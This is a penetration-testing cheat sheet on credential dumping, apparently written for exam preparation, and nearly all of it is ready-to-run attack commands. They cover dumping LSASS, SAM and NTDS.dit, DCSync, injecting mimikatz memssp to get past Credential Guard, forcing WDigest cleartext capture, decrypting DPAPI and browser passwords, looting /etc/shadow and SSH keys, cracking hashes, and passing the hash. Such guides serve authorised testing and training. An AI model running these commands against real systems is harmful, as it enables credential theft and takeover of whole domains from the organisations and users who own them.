# Credential Dumping

Once you land a shell with local admin or SYSTEM, credentials are the currency that moves you across the network. Every hash, ticket, and cleartext password you pull becomes a spray candidate for [Lateral Movement](lateral-movement.md). On the PNPT internal you dump early and dump often — the exam wants the domain, and the domain falls to reused credentials and a DCSync.

{% hint style="warning" %}
Dumping LSASS, SAM, or NTDS.dit needs local **admin** at minimum, and `lsadump::sam` / live LSASS parsing need **SYSTEM**. If `mimikatz` errors on access, you skipped a privilege step — see [Windows privesc](windows-privesc-methodology.md) first.
{% endhint %}

## Where credentials live

| Store | Location | What you get | Access needed |
| --- | --- | --- | --- |
| **LSASS memory** | `lsass.exe` process | NTLM, SHA1, Kerberos tickets, sometimes cleartext | Admin + SeDebug |
| **SAM + SYSTEM** | `HKLM\SAM`, `HKLM\SYSTEM` | Local account NTLM hashes | SYSTEM |
| **LSA Secrets** | `HKLM\SECURITY` | Service account creds, DefaultPassword, `$MACHINE.ACC` | SYSTEM |
| **DCC2 cache** | `HKLM\SECURITY\Cache` | Cached domain logons (MSCache2) | SYSTEM |
| **NTDS.dit** | `%systemroot%\NTDS\ntds.dit` | Every domain hash | Admin on DC |
| **DPAPI blobs** | `AppData\...\Credentials`, browser stores | Saved passwords, cookies, RDP creds | User context or SYSTEM |

## NetExec — dump everything remotely

The fastest first pass when you already hold valid admin credentials. One tool, every store:

```bash
nxc smb <TARGET> -u username -p password -d domain --sam        # local SAM hashes
nxc smb <TARGET> -u username -p password -d domain --lsa        # LSA secrets
nxc smb <TARGET> -u username -p password -d domain --ntds       # NTDS.dit (on a DC)
nxc smb <TARGET> -u username -p password -d domain -M lsassy     # LSASS via lsassy module
nxc smb <TARGET> -u username -p password -d domain -M nanodump   # LSASS via nanodump
nxc smb <TARGET> -u username -p password -d domain --ntds vss    # NTDS via shadow copy
```

## LSASS dumping

LSASS holds logon sessions — the richest single target on any Windows host. Dump it, then parse offline so you're not running `mimikatz` in memory where EDR watches.

### Create the dump

| Method | Command | Notes |
| --- | --- | --- |
| **procdump** | `procdump.exe -accepteula -ma lsass.exe lsass.dmp` | Signed Sysinternals binary, often slips past AV |
| **rundll32 / comsvcs** | `rundll32 C:\windows\system32\comsvcs.dll, MiniDump <LSASS_PID> C:\lsass.dmp full` | Living-off-the-land, no dropped tool |
| **Task Manager** | Details tab → `lsass.exe` → Create dump file | GUI/RDP only |
| **mimikatz (live)** | `sekurlsa::minidump lsass.dmp` then `sekurlsa::logonpasswords` | Reads a dump or live memory |

### Parse offline

```bash
pypykatz lsa minidump lsass.dmp          # offline, on your attacker box — preferred
```

```powershell
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords       # live parse on target
mimikatz # sekurlsa::ekeys                # kerberos encryption keys
```

### Read `sekurlsa::logonpasswords` output

Each logon session prints a block with sub-entries per **provider**. Know what to grep for:

| Provider | Contains | Grep for |
| --- | --- | --- |
| `msv` | Primary NTLM + SHA1 + DPAPI key | `NTLM :`, `SHA1 :`, `DPAPI :` |
| `wdigest` | Cleartext when `UseLogonCredential=1` | `Password :` (very sensitive) |
| `kerberos` | Kerberos tickets + username, sometimes cleartext | `Password :`, `Username :` |
| `tspkg` | RDP-related, usually null on modern | `Password :` (rare) |
| `credman` | Credential Manager saved creds (mstsc RDP) | `Password :`, `Target :` |
| `cloudap` | Azure AD / Entra PRT | `PRT :` |

Grep the whole dump for hashes and cleartext in one pass:

```powershell
.\mimikatz.exe "privilege::debug" "sekurlsa::logonpasswords" "exit" | Select-String -Pattern "NTLM|Password|Username|Domain|SHA1"
```

{% hint style="info" %}
`wdigest` cleartext only appears when the `UseLogonCredential` registry key is set to `1` (or on legacy Windows). Force plaintext capture on the next logon of an older box: `reg add HKLM\SYSTEM\CurrentControlSet\Control\SecurityProviders\WDigest /v UseLogonCredential /t REG_DWORD /d 1`.
{% endhint %}

### `lsadump::sam` — full three-command chain

`lsadump::sam` reads the local SAM+SYSTEM hives from LSASS memory, but it needs **SYSTEM**, not just admin. The full chain is three commands:

```
mimikatz # privilege::debug     # enable SeDebug so we can touch LSASS
mimikatz # token::elevate       # elevate the process token to SYSTEM
mimikatz # lsadump::sam         # now succeeds — dumps local user NTLM hashes
```

Skip `token::elevate` and you get `ERROR kuhl_m_lsadump_getUsersAndSamKey ; kull_m_registry_RegOpenKeyEx SAM Accounts (0x00000005)` — that's Access Denied.

### `lsadump::cache` — domain cached credentials (DCC2)

Reads offline cached logons from `HKLM\SECURITY`. Recovers hashes that never appear in LSASS or SAM, cached when a domain user logs in while the DC is unreachable:

```
mimikatz # privilege::debug
mimikatz # token::elevate
mimikatz # lsadump::cache
```

Crack with hashcat mode **2100** (DCC2). It's slow (PBKDF2-SHA1), so feed only targeted candidates:

```bash
hashcat -m 2100 dcc2.hash targeted.txt
```

Format is `$DCC2$10240#<username>#<hash>` — assemble manually if hashcat rejects the raw line.

### `misc::memssp` — Credential Guard / PPL bypass

When `sekurlsa::logonpasswords` returns protected/encrypted hashes because **Credential Guard** is on, inject a rogue SSP that logs every subsequent authentication in cleartext:

```
PS> Get-ComputerInfo | Select-String "DeviceGuardSecurityServicesRunning"   # detect first
mimikatz # privilege::debug
mimikatz # misc::memssp
```

Force a re-auth (RDP reconnect, `Win+L` unlock, `runas`), then read the log:

```powershell
type C:\Windows\System32\mimilsa.log
```

{% hint style="danger" %}
`memssp` is persistent until reboot and leaves `mimilsa.log` on disk — both are discoverable. Clean up: `Remove-Item C:\Windows\System32\mimilsa.log -Force` then reboot to unload the SSP. Note the residual artifact in your report if you can't reboot the exam target.
{% endhint %}

## SAM / SYSTEM extraction

Local account hashes without touching LSASS. Save the hives, exfil, parse offline.

**On target (admin):**

```powershell
reg save HKLM\SAM C:\Windows\Temp\sam.hiv
reg save HKLM\SYSTEM C:\Windows\Temp\system.hiv
reg save HKLM\SECURITY C:\Windows\Temp\security.hiv
```

**On attacker (offline):**

```bash
impacket-secretsdump -sam sam.hiv -system system.hiv -security security.hiv LOCAL
```

Watch the LSA Secrets output — `DefaultPassword` is a cleartext Winlogon autologon password, and `$MACHINE.ACC` is the machine account hash (useful for RBCD and relay).

Locked hives? Copy them out of a shadow copy instead:

```powershell
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM C:\Temp\SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\SYSTEM
```

## NTDS.dit — the whole domain

`NTDS.dit` on a Domain Controller holds every account hash in the domain. Pulling it is game over for the internal. You need admin on the DC and a way past the perpetual file lock, which means a shadow copy.

### Locations

```
%systemroot%\NTDS\ntds.dit          # primary
%systemroot%\System32\ntds.dit      # distribution copy
```

### Volume Shadow Copy (vssadmin)

```powershell
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\NTDS.dit C:\ShadowCopy\
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\ShadowCopy\
```

### ntdsutil IFM dump

```powershell
ntdsutil "ac i ntds" "ifm" "create full c:\temp" q q
```

### vshadow.exe (SDK, one-shot alternative)

```
vshadow.exe -nw -p C:                                       # -nw no writers, -p persistent
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopyN\windows\ntds\ntds.dit c:\ntds.dit.bak
reg.exe save hklm\system c:\system.hiv
vshadow.exe -da                                             # -da delete all persistent shadows (cleanup)
impacket-secretsdump -ntds ntds.dit.bak -system system.hiv LOCAL
```

### DiskShadow via WinRM as Backup Operator

When you hold `SeBackupPrivilege` + `SeRestorePrivilege` (Backup Operators) on a DC but not full admin — build a DiskShadow script and `robocopy /b` the files out:

```powershell
echo "set context persistent nowriters" | out-file C:\temp\shadow.txt -encoding ascii
echo "set metadata C:\temp\metadata.cab" | out-file C:\temp\shadow.txt -append -encoding ascii
echo "add volume c: alias yourAlias"     | out-file C:\temp\shadow.txt -append -encoding ascii
echo "create"                             | out-file C:\temp\shadow.txt -append -encoding ascii
echo "expose %yourAlias% z:"              | out-file C:\temp\shadow.txt -append -encoding ascii
diskshadow /s C:\temp\shadow.txt
robocopy /b z:\windows\ntds C:\temp ntds.dit      # /b = backup mode, bypasses ACLs
reg save hklm\system C:\temp\system.bak
```

```bash
impacket-secretsdump -ntds ntds.dit -system system.bak LOCAL      # parse offline
```

### Remote NTDS via secretsdump

```bash
impacket-secretsdump -dc-ip <TARGET> domain.local/administrator@<TARGET>
impacket-secretsdump -just-dc domain/user@<TARGET>                 # domain hashes only
impacket-secretsdump -just-dc-user domain/krbtgt domain/user@<TARGET>
nxc smb <TARGET> -u username -p password --ntds vss
```

### NTDS backup share loot

A share named `Password Audit`, `Backups`, `IT`, or `NTDS` containing an `Active Directory/` folder plus a `registry/` folder is an `ntdsutil` IFM dump — a golden find on hardened DCs where live DCSync isn't available:

```bash
smbclient "//<TARGET>/Password Audit" -U "DOMAIN/user%password" -c 'recurse ON; prompt OFF; mget *'
impacket-secretsdump -ntds "Active Directory/ntds.dit" -system registry/SYSTEM LOCAL
```

## DCSync — pull hashes without touching the DC disk

DCSync abuses the Directory Replication Service to ask the DC for account data as if you were another DC. No shadow copy, no file lock. You need Domain Admin, Enterprise Admin, or an account with the **Replicate Directory Changes** rights (see [AD attacks](ad-attacks.md) for the DACL abuse that grants this).

```powershell
mimikatz # lsadump::dcsync /domain:htb.local /user:krbtgt      # just krbtgt (for golden tickets)
mimikatz # lsadump::dcsync /domain:htb.local /all /csv         # everything
```

```bash
impacket-secretsdump -dc-ip <TARGET> DOMAIN/administrator@<TARGET>
nxc smb <TARGET> -u 'username' -p 'password' --ntds drsuapi
```

### secretsdump advanced flags

```bash
impacket-secretsdump DOMAIN/USER:PASS@<TARGET> -just-dc-ntlm      # NT hashes only
impacket-secretsdump DOMAIN/USER:PASS@<TARGET> -pwd-last-set      # add password timestamps
impacket-secretsdump DOMAIN/USER:PASS@<TARGET> -history           # password history
impacket-secretsdump DOMAIN/USER:PASS@<TARGET> -user-status       # enabled/disabled flag
```

## Cracking what you dumped

Hashes that won't pass-the-hash still crack into passwords you can spray elsewhere.

```bash
hashcat -m 1000 -w 4 -O -a 0 hashes.txt rockyou.txt     # NTLM
hashcat -m 5600 hashes.txt rockyou.txt                   # NTLMv2 (Responder captures)
hashcat -m 13100 hashes.txt rockyou.txt                  # Kerberoast TGS-REP
hashcat -m 18200 hashes.txt rockyou.txt                  # AS-REP roast
hashcat -m 2100 dcc2.hash rockyou.txt                    # DCC2 cached domain creds
hashcat -m 1800 shadow.txt rockyou.txt                   # Linux sha512crypt
```

```bash
john hash.txt --wordlist=rockyou.txt
john hash.txt --show
john --format=krb5tgs hash.txt --wordlist=rockyou.txt
```

Offline-only? Try [hashmob.net](https://hashmob.net), [crackstation.net](https://crackstation.net), or [hashes.com](https://hashes.com/en/decrypt/hash).

## Pass-the-Hash

Don't crack what you can replay. An NTLM hash authenticates as well as the password — feed it straight into your movement tools:

```bash
impacket-secretsdump -hashes aad3b435b51404eeaad3b435b51404ee:0f49...dfc9 domain/user@<TARGET>
xfreerdp /v:<TARGET> /u:username /d:domain /pth:88a405e17c0aa5debbc9b5679753939d
```

Full PtH tooling lives in [Lateral Movement](lateral-movement.md).

## DPAPI — saved passwords, browser creds, RDP

DPAPI encrypts saved browser passwords, Credential Manager blobs, and RDP creds. With SYSTEM (or the user's password + SID) you decrypt them offline.

### The impacket dpapi.py chain

```bash
# Step 1 — decrypt the masterkey with user's SID + cleartext password
dpapi.py masterkey -file <MK_GUID> -sid S-1-5-21-...-1110 -password 'UserPassword!'
# → outputs the master key hex

# Step 2 — decrypt a credential blob with the recovered key
dpapi.py credential -file <CRED_BLOB> -key 0xd2832547d1d5e0a01ef271...
```

Masterkey and blob locations:

```
C:\Users\<USER>\AppData\Roaming\Microsoft\Protect\<SID>\<MK_GUID>     # masterkeys
C:\Users\<USER>\AppData\Local\Microsoft\Credentials\                 # credential blobs
C:\Users\<USER>\AppData\Roaming\Microsoft\Credentials\
```

### Exfil the masterkey when mimikatz is blocked

```powershell
[Convert]::ToBase64String([IO.File]::ReadAllBytes("C:\Users\<USER>\AppData\Roaming\Microsoft\Protect\<SID>\<MK_GUID>"))
```

```bash
echo "<b64>" | base64 -d > <MK_GUID>      # then feed to dpapi.py masterkey
```

### Chrome / Edge browser passwords

```powershell
.\SharpChrome.exe logins /unprotect       # on target with admin
```

```bash
impacket-secretsdump <DOMAIN>/<USER>@<TARGET> -hashes ':<NTLM_HASH>'   # get DPAPI_SYSTEM keys
```

Chrome/Edge login data lives at `AppData\Local\Google\Chrome\User Data\Default\Login Data` with the AES key in `Local State`. Browser stores routinely hold internal app, admin panel, VPN, and cloud creds — always check them after SYSTEM.

### DonPAPI — remote, all DPAPI at once

```bash
python3 DonPAPI.py <DOMAIN>/<USER>:<PASS>@<TARGET>
python3 DonPAPI.py <DOMAIN>/<USER>@<TARGET> -hashes :<NTHASH>
```

### PSCredential XML (Export-Clixml)

If a script stored creds with `Export-Clixml`, decrypt as the same user on the same machine:

```powershell
$cred = Import-CliXml <FILE>.xml
$cred.GetNetworkCredential().Password
$cred.GetNetworkCredential().Username
```

## Stored & cached secrets (quick wins)

```powershell
cmdkey /list                                        # stored Windows credentials
vaultcmd /listcreds:"Windows Credentials" /all
netsh wlan show profile name="<SSID>" key=clear     # saved Wi-Fi key
```

## Linux credential access

### Kerberos ticket reuse (CCACHE)

```bash
ls /tmp/ | grep krb5cc
export KRB5CCNAME=/tmp/krb5cc_1000
kinit -c /tmp/krb5cc_1000 user@DOMAIN.LOCAL
```

### Keytab extraction

```bash
klist -k /etc/krb5.keytab
python3 KeytabParser.py /etc/krb5.keytab
```

### SSSD + keyring tickets

```bash
./sss_deobfuscate AAAQABag...AAQID       # deobfuscate SSSD cached creds
./tickey -i                              # extract tickets from the kernel keyring
```

### The usual Linux loot

```bash
cat /etc/shadow                          # hashes (root); crack with hashcat -m 1800
find / -name "id_rsa" 2>/dev/null        # SSH private keys
grep -rniE 'pass|secret|key' /etc /home /var/www 2>/dev/null
cat ~/.bash_history /home/*/.bash_history
```

## Hunting credentials in files

Both OSes leak secrets in configs, scripts, and backups. Grep before you dig deeper.

```
C:\Users\<USER>\Documents\*.xlsx          # password spreadsheets
C:\Backups\web.config*                     # IIS creds in cleartext
C:\Users\<USER>\Documents\*.bat / *.ps1    # scripts with net use / hardcoded creds
%APPDATA%\FileZilla\sitemanager.xml        # base64 (not encrypted) FTP passwords
```

### Structured credential stores

| File | Extract + crack |
| --- | --- |
| KeePass `.kdbx` | `keepass2john Shared.kdbx > h; hashcat -m 13400 h rockyou.txt` |
| Office `.xlsx/.docx` | `office2john file.xlsx > h; hashcat -m 9600 h rockyou.txt` |
| Ansible Vault | `ansible2john vault.yml > h; john h --wordlist=rockyou.txt` then `ansible-vault view vault.yml --ask-vault-pass` |
| FileZilla XML | `echo -n 'BASE64==' | base64 -d` |
| Firefox `key4.db` + `logins.json` | `python3 firepwd.py -d /path/to/profile/` |

## Network credential capture

After a [pivot](pivoting-tunneling.md), sniff the wire for cleartext auth:

```bash
python3 ./Pcredz -f capture.pcap -v       # from a pcap
sudo python3 ./Pcredz -i eth0             # live
```

Captures HTTP Basic, FTP, SMTP, POP3, IMAP, Telnet, SNMP community strings, NTLMv1/v2, Kerberos, and LDAP.

## Workflow

```
# 1. Confirm you have admin/SYSTEM (whoami /priv, whoami /groups)
# 2. Fast remote pass with NetExec --sam --lsa --ntds
# 3. Dump LSASS (procdump/comsvcs) → parse offline with pypykatz
# 4. Save SAM/SYSTEM/SECURITY hives → secretsdump LOCAL
# 5. On a DC: DCSync (mimikatz/secretsdump) or shadow-copy NTDS.dit
# 6. Loot DPAPI, browsers, config files, credential stores
# 7. Crack what won't pass-the-hash; SPRAY every new credential (see Lateral Movement)
```

## Report notes

* Record exactly which privilege let you dump (local admin, SYSTEM, Backup Operators, DCSync rights) — the severity hinges on it.
* A single reused local-admin hash that unlocks the domain is the story the report should tell. Trace the chain.
* Flag any persistent artifacts you left behind (`memssp`, dropped dumps, shadow copies) and confirm cleanup.
* Log where every credential came from — the report needs provenance.

## Related

* [Windows Privesc](windows-privesc-methodology.md) · [Linux Privesc](linux-privesc-methodology.md) — get to admin/SYSTEM before you can dump
* [Lateral Movement](lateral-movement.md) — spray and replay every credential you pull here
* [AD Attacks](ad-attacks.md) — Kerberoast, AS-REP, golden tickets, and the DACL abuse that grants DCSync rights
* [Pivoting & Tunneling](pivoting-tunneling.md) — reach the DC and sniff internal traffic
* [File Transfers](file-transfers.md) — get mimikatz/procdump onto the target and dumps back out
* [Shells & Payloads](shells-payloads.md) — the shell you're dumping from
* [Report Writing](report-writing.md) — turning a dumped domain into a rated finding
